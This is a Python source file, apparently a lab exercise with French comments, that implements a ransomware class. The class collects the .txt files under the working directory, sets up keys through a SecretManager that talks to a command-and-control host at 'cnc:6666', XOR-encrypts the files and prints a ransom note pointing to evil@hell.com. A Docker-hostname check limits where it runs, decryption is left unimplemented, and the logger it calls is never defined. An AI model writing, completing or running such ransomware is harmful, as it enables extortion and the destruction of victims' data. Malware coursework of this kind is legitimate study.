import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        # Définir le répertoire de départ comme étant le répertoire actuel
        current_directory = Path(".")
        # Parcourir tous les fichiers correspondant au filtre en excluant les liens symboliques
        files_found = [str(file.resolve()) for file in current_directory.rglob(filter) if not file.is_symlink()]
        return files_found

    def encrypt(self):
        # main function for encrypting (see PDF)
        try:
            # Obtenir la liste des fichiers à chiffrer
            files_to_encrypt = self.get_files("*.txt")
            
            # Créer le gestionnaire de secrets avec les chemins donnés
            secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
            
            # Configurer le gestionnaire de secrets (génère les éléments cryptographiques)
            secret_manager.setup()
            
            # Chiffrer les fichiers trouvés
            secret_manager.xor_files(files_to_encrypt)
            
            # Obtenir le token en format hexadécimal et afficher le message pour la victime
            hex_token = secret_manager.get_hex_token()
            print(f"\nVos fichiers .txt ont été chiffrés. Contactez l'attaquant avec ce token pour déchiffrer : {hex_token}\n")
            
            # Log success message
            self._log.info("Chiffrement terminé. Le message a été affiché pour la victime.")
        except Exception as e:
            self._log.error(f"Erreur lors du chiffrement : {e}")
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()